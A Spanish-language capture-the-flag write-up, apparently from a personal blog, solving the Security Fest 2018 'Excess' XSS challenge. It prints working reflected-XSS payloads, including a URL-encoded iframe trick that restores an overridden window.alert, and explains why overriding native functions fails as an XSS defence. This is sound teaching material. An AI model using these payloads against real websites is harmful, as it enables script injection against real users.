---
title: 'Security Fest #CTF – Excess write up (XSS)'
author: Alevsk
type: post
date: 2018-06-15T05:37:07+00:00
url: /2018/06/security-fest-ctf-excess-write-up-xss/
categories:
  - Ethical Hacking
  - Javascript
  - IT News
  - Personal
  - Talks and Events
  - Programming
  - Snippets
  - Technology
  - Tutorials
tags:
  - capture the flag
  - ctf
  - hacking
  - Ethical Hacking
  - owasp
  - xss

---
[![](/images/xss.png)](http://www.alevsk.com/2018/06/security-fest-ctf-excess-write-up-xss/xss/)

Este año 2018, uno de mis principales propósitos fue tratar de participar en la mayor cantidad de [CTFs](https://www.alevsk.com/tag/ctf/) posibles, son como pequeños acertijos que mantienen mi mente ágil en cuanto a la seguridad informática y siempre aprendo algo nuevo cada vez que los juego.

Existen muchos recursos en Internet pero uno de los mejores, y que he estado usando los últimos meses, es [CTFtime](https://ctftime.org/). **CTFtime** es un portal que recopila información acerca de varios eventos **Capture The Flag** que ocurren alrededor del mundo, tanto eventos presenciales como online (puedes participar remotamente), ademas de eso es una gran fuente de aprendizaje ya que siempre puedes revisar las soluciones de los retos anteriores. Si desean ver los próximos eventos tienen una lista que pueden revisar en el siguiente [link](https://ctftime.org/event/list/upcoming)
[![](/images/Screen-Shot-2018-06-14-at-11.06.31-PM-1200x507.png)](http://www.alevsk.com/2018/06/security-fest-ctf-excess-write-up-xss/screen-shot-2018-06-14-at-11-06-31-pm/)

Por mi parte estoy listo para participar en [Viettel Mates CTF 2018](https://ctftime.org/event/629) este fin de semana 🙂 y el 23 de junio en [Google Capture The Flag 2018 (Quals)](https://ctftime.org/event/623)

Regresando a la idea principal de este articulo, el 31 de mayo participe en el [Security Fest #CTF](https://securityfest.com/), no resolví tantos retos como me hubiera gustado pero si aprendi un par de cosas nuevas que les voy a compartir a continuación.

<div class="wp-caption aligncenter" id="attachment_4541" style="width: 1066px">
[![](/images/Screen-Shot-2018-05-31-at-10.23.56-AM.png)](http://www.alevsk.com/2018/06/security-fest-ctf-excess-write-up-xss/screen-shot-2018-05-31-at-10-23-56-am/)
<p class="wp-caption-text" id="caption-attachment-4541">
    El CTF tenia tematica de [The Matrix](https://en.wikipedia.org/wiki/The_Matrix), kudos por eso!
  </p>
</div>

## Security Fest CTF Excess – Web Challenge

**Excess** fue uno de los primeros retos de la categoría web, en las instrucciones se nos daba un link a una pagina web y al entrar veíamos la siguiente pantalla.

[![](/images/Screen-Shot-2018-05-31-at-1.08.22-PM.png)](http://www.alevsk.com/2018/06/security-fest-ctf-excess-write-up-xss/screen-shot-2018-05-31-at-1-08-22-pm/)

Las instrucciones son bastante claras, tenemos que encontrar un [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) en el sitio y hacer que muestre un [alert](https://www.w3schools.com/Jsref/met_win_alert.asp), después mandar la URL con nuestro payload y reclamar la bandera.

Vemos que la pagina tiene un parámetro llamado **xss**, inspeccionamos el código fuente del sitio web y vemos lo siguiente.

[![](/images/Screen-Shot-2018-05-31-at-1.12.41-PM.png)](http://www.alevsk.com/2018/06/security-fest-ctf-excess-write-up-xss/screen-shot-2018-05-31-at-1-12-41-pm/)

Observamos que el valor del parámetro xss es utilizado directamente por unas variables en [Javascript](https://www.alevsk.com/category/javascript/) y eso es bueno para nosotros, pues podemos inyectar código directamente sin preocuparnos por crear nuestras propias [script tags](https://www.w3schools.com/tags/tag_script.asp).

Viendo el código anterior es claro que el sitio web es vulnerable y podemos mandar un payload como el siguiente para mostrar nuestro alert en **Javascript**.

En el parámetro xss enviamos:

```bash
/?xss=<strong>hello';alert(1);//</strong>
```

Y el código se va a inyectar de la siguiente forma:

```html
…  
..  
<div class="container">
<script>var x ='hello';alert(1);//; var y = \`hello';alert(1);//; var z = "hello';alert(1);//;</script>
<div class="row main">
<div class="form-header header">  
…  
..
```

Nuestro payload se inyecta 3 veces, pero no importa puesto que después del primer **//** todo el resto del código quedara comentado. En el sitio web vemos la siguiente alerta.

[![](/images/Screen-Shot-2018-05-31-at-1.12.15-PM.png)](http://www.alevsk.com/2018/06/security-fest-ctf-excess-write-up-xss/screen-shot-2018-05-31-at-1-12-15-pm/)

¿Qué?, ¿Cómo?, ¿Cuándo? xd nosotros inyectamos un alert no un [prompt](https://www.w3schools.com/jsref/met_win_prompt.asp), inspeccionando el código fuente del sitio mas a detalle y observamos que hay un script que se esta llamando antes de que inyectemos nuestro código.

```html
<script src="/static/no\_alert\_for_you.js"></script><section class="login-info">
```

Al ver su contenido nos damos cuenta de que es el responsable de nuestros dolores de cabeza.

```javascript
/*

If there is no alert,  
how can there be XSS?  
/  
/  
) (  
/( (\___/) )\  
( #) \ (")| ( #  
||\_\\_\_c\ > '\_\_||  
||*\*\\*\* ),_/ \*\*'|  
.__ |'\* \_\\_\_| |\_\__\*'|  
\_\ |' ( ~ ,)'|  
(( |' /(. ' .)\ |  
\\_|\_/ <\_ __\_\\_\_> \\_\_\___\___\___\___  
/ '-, \ / ,-' \___\___ \  
b'ger / (// \\) __/ / \  
'./\_____/

*/  
window.alert = (x=>prompt("He confirm. He alert. But most of all he prompt."));
```

Este pequeño código esta sobrescribiendo la función nativa **alert** del objeto Window en nuestro contexto actual.

Es claro lo que debemos hacer, de alguna forma tenemos que devolver a Window.alert la función nativa original, existen muchas formas de resolver este reto pero mi razonamiento fue el siguiente.

Después de investigar un buen rato encontré varios artículos que describen esta técnica (override de funciones nativas) para mitigar ataques de **XSS**, sin embargo esto no soluciona el problema debido a la misma naturaleza del lenguaje **Javascript**, a continuación muestro como creando un elemento iframe, que tiene una instancia nueva y sin modificar del objeto Window, es posible ejecutar las funciones nativas originales.

```javascript
var iframe = document.createElement('iframe'); // creamos un nuevo iframe  
iframe.src = ";  
iframe.style.display = 'none';  
document.body.appendChild(iframe); // Es necesario agregarlo al documento para que su atributo contentWindow este definido  
window.alert = iframe.contentWindow.alert; // Sobrescribimos la función alert de nuestro objeto Window actual con la función nativa original  
alert(1); // Ejecutamos el alert original
```

Armamos nuestro payload y lo inyectamos en el parámetro **xss**.

```bash
/?xss=hello%27;var%20iframe=document.createElement(%27iframe%27);iframe.src=%27%27;iframe.style.display=%27none%27;document.body.appendChild(iframe);window.alert=iframe.contentWindow.alert;alert(1);//
```

Y veremos el alert original en la pantalla, enviamos la **URL** con nuestro **payload** y obtenemos la bandera de este reto.

[![](/images/Screen-Shot-2018-05-31-at-4.43.41-PM.png)](http://www.alevsk.com/2018/06/security-fest-ctf-excess-write-up-xss/screen-shot-2018-05-31-at-4-43-41-pm/) 

Happy hacking 🙂</section></div></div></div>